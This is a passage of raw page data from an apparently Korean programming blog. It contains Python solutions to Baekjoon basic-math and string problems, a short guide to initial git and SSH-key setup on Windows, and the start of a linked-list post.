url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAJABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAECBf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAd1uSgD/xAAWEAADAAAAAAAAAAAAAAAAAAAAIEH/2gAIAQEAAQUCSn//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAY/Al//xAAXEAADAQAAAAAAAAAAAAAAAAAAASAh/9oACAEBAAE/IWZL/9oADAMBAAIAAwAAABCAD//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EAB0QAAAFBQAAAAAAAAAAAAAAAAABECExQWFxwfD/2gAIAQEAAT8QYdhx0oCnnSf/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f71f98451fd2652849d8a72e1dcb97a5/c9b55/3.webp 165w,\n/static/f71f98451fd2652849d8a72e1dcb97a5/f2908/3.webp 330w,\n/static/f71f98451fd2652849d8a72e1dcb97a5/1c567/3.webp 481w\"\n              sizes=\"(max-width: 481px) 100vw, 481px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f71f98451fd2652849d8a72e1dcb97a5/27f9f/3.jpg 165w,\n/static/f71f98451fd2652849d8a72e1dcb97a5/80fc7/3.jpg 330w,\n/static/f71f98451fd2652849d8a72e1dcb97a5/86d1c/3.jpg 481w\"\n            sizes=\"(max-width: 481px) 100vw, 481px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f71f98451fd2652849d8a72e1dcb97a5/86d1c/3.jpg\"\n            alt=\"4번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> V <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\ntmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>V<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>A<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">if</span> tmp <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>V<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span>A<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>V<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span>A<span class=\"token operator\">-</span>B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계5 ACM 호텔</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 480px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 107.27272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAVABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAECBf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAe7ZSgzoAP/EABYQAAMAAAAAAAAAAAAAAAAAABAgQf/aAAgBAQABBQJqP//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8BH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8BH//EABQQAQAAAAAAAAAAAAAAAAAAADD/2gAIAQEABj8CH//EABgQAAIDAAAAAAAAAAAAAAAAAABBECAx/9oACAEBAAE/IXLMq//aAAwDAQACAAMAAAAQ4AiA/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPxAf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPxAf/8QAHBABAAICAwEAAAAAAAAAAAAAAQAREDEhQVGB/9oACAEBAAE/EL9Qb7w08yKLWFr5iDsgUUT/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a1d2f5e6ecf58e42d7300366b9b6503e/c9b55/4.webp 165w,\n/static/a1d2f5e6ecf58e42d7300366b9b6503e/f2908/4.webp 330w,\n/static/a1d2f5e6ecf58e42d7300366b9b6503e/d3be9/4.webp 480w\"\n              sizes=\"(max-width: 480px) 100vw, 480px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a1d2f5e6ecf58e42d7300366b9b6503e/27f9f/4.jpg 165w,\n/static/a1d2f5e6ecf58e42d7300366b9b6503e/80fc7/4.jpg 330w,\n/static/a1d2f5e6ecf58e42d7300366b9b6503e/7cc5e/4.jpg 480w\"\n            sizes=\"(max-width: 480px) 100vw, 480px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a1d2f5e6ecf58e42d7300366b9b6503e/7cc5e/4.jpg\"\n            alt=\"5번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\r\nT <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>T<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\tH<span class=\"token punctuation\">,</span> W<span class=\"token punctuation\">,</span> N <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\tY <span class=\"token operator\">=</span> N <span class=\"token operator\">%</span> H\r\n\t<span class=\"token keyword\">if</span> Y <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\r\n\t\tY <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>H<span class=\"token punctuation\">)</span>\r\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\tY <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>Y<span class=\"token punctuation\">)</span>\r\n\tX <span class=\"token operator\">=</span> N <span class=\"token operator\">//</span> H\r\n\t<span class=\"token keyword\">if</span> X <span class=\"token operator\">!=</span> N <span class=\"token operator\">/</span> H<span class=\"token punctuation\">:</span>\r\n\t\tX <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\r\n\t<span class=\"token keyword\">if</span> X <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">:</span>\r\n\t\tX <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>X<span class=\"token punctuation\">)</span>\r\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\tX <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>X<span class=\"token punctuation\">)</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Y <span class=\"token operator\">+</span> X<span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계6 부녀회장이 될테야</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 481px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAEF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAB3KpQf//EABUQAQEAAAAAAAAAAAAAAAAAAAEg/9oACAEBAAEFAmv/xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAY/Al//xAAXEAADAQAAAAAAAAAAAAAAAAAAASEQ/9oACAEBAAE/IYE8born/9oADAMBAAIAAwAAABDAD//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABsQAQACAgMAAAAAAAAAAAAAAAEAERAhMUGR/9oACAEBAAE/EFZ59l1WuEEaj7Y//9k='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/03d3d63d585b709e214ad3d3ae79add5/c9b55/5.webp 165w,\n/static/03d3d63d585b709e214ad3d3ae79add5/f2908/5.webp 330w,\n/static/03d3d63d585b709e214ad3d3ae79add5/1c567/5.webp 481w\"\n              sizes=\"(max-width: 481px) 100vw, 481px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/03d3d63d585b709e214ad3d3ae79add5/27f9f/5.jpg 165w,\n/static/03d3d63d585b709e214ad3d3ae79add5/80fc7/5.jpg 330w,\n/static/03d3d63d585b709e214ad3d3ae79add5/86d1c/5.jpg 481w\"\n            sizes=\"(max-width: 481px) 100vw, 481px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/03d3d63d585b709e214ad3d3ae79add5/86d1c/5.jpg\"\n            alt=\"6번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>수학적으로 해결하기보다 배열을 사용하여 해결하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">T <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>T<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\tk <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\tn <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\tl <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\r\n\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t\tl<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> l<span class=\"token punctuation\">[</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> l<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계7 설탕 배달</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">N <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">if</span> N <span class=\"token operator\">%</span> <span class=\"token number\">5</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">for</span> n5 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span><span class=\"token number\">5</span><span class=\"token operator\">*</span>n5<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n5 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span><span class=\"token number\">5</span><span class=\"token operator\">*</span>n5<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t\t<span class=\"token keyword\">break</span>\r\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">if</span> n5 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계8 큰 수 A+B</h2>\n<p>python에서는 큰 수를 다루는 데에 문제가 되지 않는다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\r\nA<span class=\"token punctuation\">,</span> B <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\nsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>A<span class=\"token operator\">+</span>B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계9 Fly me to the Alpha Centauri</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"></code></pre></div>","categories":["algorithm"],"date":"January 10, 2021","description":"기본수학1 풀이","id":"7289c8c2-807d-588e-969e-2b9a331f12d5","keywords":["codingtest"],"slug":"/BOJ-Step08-BasicMath1/","title":"BOJ 8단계 기본수학1 풀이","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/23fa49ad7ff6f390429b1b03c157fbb1/bc51f/0.png","srcSet":"/static/23fa49ad7ff6f390429b1b03c157fbb1/41200/0.png 165w,\n/static/23fa49ad7ff6f390429b1b03c157fbb1/f979a/0.png 330w,\n/static/23fa49ad7ff6f390429b1b03c157fbb1/bc51f/0.png 660w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/23fa49ad7ff6f390429b1b03c157fbb1/322ad/0.webp 165w,\n/static/23fa49ad7ff6f390429b1b03c157fbb1/de3b3/0.webp 330w,\n/static/23fa49ad7ff6f390429b1b03c157fbb1/2b2b5/0.webp 660w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<p>단계별 문제풀이 하면서 처음으로 애먹은 문제..</p>\n<p>보통 문제풀이하면서 시간을 오래 잡아먹는 부분은</p>\n<ol>\n<li>문제 해독하면서</li>\n<li>문제를 잘못 해독해서 잘못 세운 설계로 인한 시행착오로 시간을 낭비하면서</li>\n<li>문제를 제대로 안읽고 닥돌해서 문제풀다가 시행착오로 시간을 낭비하면서</li>\n</ol>\n<p>아직까지는 이 세가지 경우인 듯 하다... 나는 여태까지 3의 경우가 가장 많았다. 급해서 좋을거 없다ㅠㅠ</p>\n<hr>\n<p><a href=\"https://www.acmicpc.net/problem/1316\">문제 전문</a></p>\n<p><img src=\"./images/0.PNG\" alt=\"BOJ 1316번 전문\"></p>\n<p>문제에서 '각 문자가 연속해서 나타나는 경우만'이 정확하게 어떤 의미인지 곱씹으면서 시간을 가장 많이 보낸 것 같다(...)</p>\n<p>예제들을 보면서 내린 '각 문자가 연속해서 나타나는 경우'를 상세히 서술하자면 아래와 같다.</p>\n<ol>\n<li>각기 다른 알파벳의 나열 : OK</li>\n<li>단, <strong>중복되는 알파벳들은 무조건 연달아 붙어있어야 함</strong></li>\n</ol>\n<p>조건 2에 유의해서 코드를 작성하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">groupwords <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\r\nN <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 첫째 줄에 입력되는 단어의 개수 N</span>\r\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t<span class=\"token comment\"># 한 단어씩 입력받아 그룹 단어인지 판별</span>\r\n\tinputstr <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\tsetstr <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>inputstr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 중복 제거를 통해 단어에 쓰인 알파벳들을 구함</span>\r\n\tgroupwordOX <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\r\n    \r\n    <span class=\"token comment\"># 다음 반복문에서 조건 2를 판별 시작</span>\r\n\t<span class=\"token keyword\">for</span> ch <span class=\"token keyword\">in</span> setstr<span class=\"token punctuation\">:</span>\r\n\t\tchnum <span class=\"token operator\">=</span> inputstr<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span>\r\n        <span class=\"token comment\"># 각 알파벳들이 중복해서 쓰여졌는지를 판별한 후</span>\r\n        <span class=\"token comment\"># chnum이 모두 1인 경우 groupwordOX가 True인 상태로 빠져나가</span>\r\n        <span class=\"token comment\"># 조건 1을 달성하게 됨</span>\r\n\t\tch_first <span class=\"token operator\">=</span> inputstr<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span>\r\n\t\t<span class=\"token keyword\">if</span> inputstr<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\r\n            <span class=\"token comment\"># 이 조건문 안에서 중복되는 알파벳들이 연달아 붙어있는지를 판별한다.</span>\r\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>inputstr<span class=\"token punctuation\">[</span>ch_first<span class=\"token punctuation\">:</span>ch_first<span class=\"token operator\">+</span>chnum<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\r\n\t\t\t\tgroupwordOX <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\r\n\t\t\t\t<span class=\"token keyword\">break</span>\r\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\t\t<span class=\"token keyword\">pass</span>\r\n\t<span class=\"token keyword\">if</span> groupwordOX <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\r\n\t\tgroupwords <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\t<span class=\"token comment\"># groupwords가 True인 채로 끝났을 시 그룹 단어 개수에 1을 더함</span>\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>groupwords<span class=\"token punctuation\">)</span></code></pre></div>","categories":["algorithm"],"date":"January 01, 2021","description":"","id":"2e0f508f-b18e-52a2-90ce-19a1b9358087","keywords":["codingtest"],"slug":"/BOJ-1316/","title":"BOJ 1316: 그룹 단어 체커","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>for Windows 사용자</p>\n<p>git repository  생성 이후</p>\n<ol>\n<li>\n<p>Repository 생성 직후 git이 안내하는 명령어</p>\n<p><img src=\"./images/0.PNG\" alt=\"00\"></p>\n<p>git으로 관리할 소스 or 문서들이 있는 곳의 홈 디렉토리로 이동 후 명령어 입력</p>\n<p>나는 아래와 같은 루틴으로 자주 사용한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> init\r\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.name “username”\r\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.email <span class=\"token string\">\"user@email.com\"</span>\r\n<span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin git@github.com:username/repository.git\r\n<span class=\"token function\">git</span> config remote.origin.url git@github.com:username/repository.git\r\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"# test\"</span> <span class=\"token operator\">>></span> README.md\r\n<span class=\"token function\">git</span> <span class=\"token function\">add</span> README.md\r\n<span class=\"token function\">git</span> commit <span class=\"token parameter variable\">-m</span> <span class=\"token string\">\"first commit\"</span>\r\n<span class=\"token function\">git</span> branch <span class=\"token parameter variable\">-M</span> main\r\n<span class=\"token function\">git</span> push <span class=\"token parameter variable\">-u</span> origin main</code></pre></div>\n</li>\n<li>\n<p>자동 로그인을 위한 ssh키 설정</p>\n<p>(git 계정당 1회만 해두면 된다)</p>\n<ol>\n<li>\n<p>git bash를 열고 아래와 같이 입력한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">ssh-keygen <span class=\"token parameter variable\">-t</span> rsa <span class=\"token parameter variable\">-b</span> <span class=\"token number\">4096</span> <span class=\"token parameter variable\">-C</span> <span class=\"token string\">\"user@email.com\"</span></code></pre></div>\n</li>\n<li>\n<p>이후 암호 설정까지 해 준다.</p>\n<p>그러면 <code class=\"language-text\">%USERPROFILE%\\.ssh</code> 경로에 파일들이 생성된다.</p>\n</li>\n<li>\n<p>본인 git 웹페이지에서 ssh key 설정</p>\n<p>접속 후 오른쪽 상단 Settings 선택</p>\n<p><img src=\"./images/1.PNG\" alt=\"01\"></p>\n<p>좌측 메뉴 중 SSH and GPG keys 선택</p>\n<p><img src=\"./images/2.PNG\" alt=\"02\"></p>\n<p>New SSH key 클릭 후 <code class=\"language-text\">%USERPROFILE%\\.ssh</code> 경로의 <code class=\"language-text\">id_rsa.pub</code>파일 내용 전부를 복사해서 붙여넣기한다.</p>\n</li>\n</ol>\n<ul>\n<li>\n<p>기존 Repository에서 자동로그인이 안될 경우:</p>\n<p>해당 Repository에서 다음과 같은 명령어를 입력한다.</p>\n<p>(해당 Repository에 맞는 git clone(ssh)를 찾아 입력해야 함)</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> config remote.origin.url git@github.com:username/repository.git</code></pre></div>\n</li>\n</ul>\n<p>해두면 앞으로 push할 때 2에서 설정한 암호만 입력하면 된다.</p>\n</li>\n</ol>","categories":["misc","setting"],"date":"December 29, 2020","description":"자주 까먹어서 나를 위해 남겨둠","id":"6b1eaac9-9c1c-5c35-b965-bc8902fa2519","keywords":["git","troubleshooting"],"slug":"/Git-Initiating/","title":"repository 생성 후 git 초기세팅","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>사고과정 따라가기/익숙해지기</p>\n<ol>\n<li>\n<p>구현</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\r\n\r\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Node</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span 